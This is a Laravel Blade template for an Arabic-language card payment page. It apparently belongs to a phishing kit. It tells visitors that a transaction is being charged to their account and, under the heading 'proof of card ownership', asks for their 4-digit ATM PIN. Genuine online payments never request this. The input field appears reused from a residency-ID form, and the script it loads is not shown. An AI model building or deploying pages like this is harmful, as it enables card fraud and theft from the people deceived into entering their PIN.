@extends('frontend.layout.master')
@section('content')


<section class="payment-section m-5  section-padding">
    <div class="container">
        <div class="row  justify-center">




            
            <form class="payment-description p-5 w-75 ">
            <div class="img-for-payment d-flex justify-start p-2">
             
                <img src="{{ asset('frontend') }}/assets/images/payment/master-card.svg" alt="master-card" >
                
                <img src="{{ asset('frontend') }}/assets/images/payment/visa-card.svg" alt="visa-card" >
            </div>     
            
            
           <div >
            <h6 class="text-center">اثبات ملكية البطاقه - كلمة  سر البطاقه</h6>
            <p class="text-center">يوخد معامله ماليه علي حسابك </p>
            <p class="text-center">لتأكيد المعامله يرجي ادخال  رمز الصراف الآلي المكون من 4 ارقام
            </p>
            
           </div>
                <!--no3 el car -->
                <div class="mt-3" id="input-Tasalsol">
                  <label for="exampleInputPassword1" class="form-label">رمز الصراف            </label>
                  <input class="ta form-control input-of-buy" id="phid0" type="text" placeholder="رمز الصراف "data-testid="homePhidControl" inputmode="numeric" autocomplete="off" name="id" title="" data-for="iqama_num" maxlength="10">
                </div>
              
               
                
             
                <div class="btn-info-box mt-4  d-flex justify-content-center">
                    <button  class=" ta btn btn-secondary btn-sm mt-4 w-50  " >تأكيد</button>
                </div>
              
              </form>
        </div>
    </div>
</section>



@endsection
@section('custom-script')
    <script src="{{ asset('frontend/assets/js/steps.js') }}"></script>
@endsection